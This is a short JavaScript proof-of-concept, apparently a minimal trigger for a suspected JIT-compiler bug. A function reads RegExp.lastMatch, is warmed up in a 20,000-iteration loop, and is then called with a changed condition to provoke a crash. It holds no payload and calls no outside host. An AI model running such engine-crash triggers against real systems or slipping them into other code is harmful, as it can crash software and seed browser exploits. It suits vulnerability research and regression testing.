function poc(trigger) {
  if (trigger) {
    "a".match(/a/);
  }
  const a = RegExp.lastMatch;
  const b = [1.1, 2.2, 3.3, 4.4, 5.5];
  return a.length;
}

for (let i = 0; i < 20000; i++) {
  poc(false);
}

poc(true);